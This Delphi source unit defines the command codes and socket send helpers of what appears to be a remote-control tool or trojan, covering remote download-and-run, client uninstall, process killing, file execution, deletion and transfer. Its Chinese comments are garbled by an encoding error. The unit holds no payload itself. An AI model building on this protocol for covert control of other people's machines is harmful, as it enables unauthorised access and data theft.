{
  ͨ�����ݵ�Ԫ
}
unit VarUnit;

interface

uses
  Windows, Winsock, SocketUnit;


const
  Sock_Error        = $0FFFFFFF;
  Sock_Close        = $00FFFFFF;
  MIN_BUFFER_SIZE   = 4;
  MinEx_BUFFER_SIZE = 8;

const
  //  ��������
  Client_Online = $AABB01FF;      //  ��������
  Client_Ping   = $AABB0101;      //  PIng����
  Client_Close  = $AABB0102;      //  �ر�Client����
  Client_Remove = $AABB0103;      //  ж��Client����
  Client_Test   = $AABB0199;      //  ���ԶԻ���

  //  ��һ����
  Client_Download       = $AABB0201;  //  ����Զ������+Run
  //  Process Manager
  Client_GetProcessList = $AABB0202;  //  ��ȡ�����б�
  Client_KillProcess    = $AABB0203;  //  ɱ������

  //  �ļ��������
  Get_DiskList  = $AABB0301;      //  ��ȡ�����б�
  Get_DirList   = $AABB0302;      //  ��ȡĿ¼�б�
  Get_FileList  = $AABB0303;      //  ��ȡ�ļ��б�

  //  �ļ���������
  File_Execute  = $AABB0304;      //  Զ��ִ���ļ�
  File_Delete   = $AABB0305;      //  �ļ�ɾ��
  Dir_New       = $AABB0306;      //  �½��ļ���
  Dir_Delete    = $AABB0307;      //  ɾ���ļ���

  //  �ļ���������
  File_UploadBegin    = $AABB0308;  //  �ļ��ϴ���ʼ
  File_UploadEnd      = $AABB0309;  //  �ϴ����
  File_DownLoadBegin  = $AABB030A;  //  �ļ���ʼ����
  File_DownloadEnd    = $AABB030B;  //  �ļ��������
  File_IO_Error       = $AABB03FF;  //  I/O����

Type
  //  ��С��(����)���ݰ�
  TMinBufferHeader = Record
    dwSocketCmd: DWORD;
  end;
  PMinBufferHeader = ^TMinBufferHeader;
  
  //  ���ݳ������ݰ�
  TMinExBufferHeader = Record
    dwSocketCmd: DWORD;
    dwBufferSize: DWORD;
  end;
  PMinExBufferHeader = ^TMinExBufferHeader;

function MakeSocketCmd(dwSockCmd: DWORD): String;

function SendData(MasterSocket: TClientSocket; StrData: String): Boolean; overload;
function SendData(MasterSocket: TClientSocket; dwSocketCmd: DWORD; StrData: String): Boolean; overload;

implementation

function MakeSocketCmd(dwSockCmd: DWORD): String;
var
  lpChar: Pchar;
begin
  lpChar := @dwSockCmd;
  Result := lpChar[0] + lpChar[1] + lpChar[2] + lpChar[3];
end;

//  ���ͺ���
function SendData(MasterSocket: TClientSocket; StrData: String): Boolean;
var
  Results: Integer;
begin
  Sleep(1);
  Results := MasterSocket.SendString(StrData);
  case Results of
    SOCKET_ERROR: Result := False;
  else
    Result := True;
  end;
end;

//  ���ͺ���
function SendData(MasterSocket: TClientSocket; dwSocketCmd: DWORD; StrData: String): Boolean;
var
  Results: Integer;
begin
  Sleep(1);
  StrData := MakeSocketCmd(dwSocketCmd) + StrData;
  Results := MasterSocket.SendString(StrData);
  case Results of
    SOCKET_ERROR: Result := False;
  else
    Result := True;
  end;
end;


end.
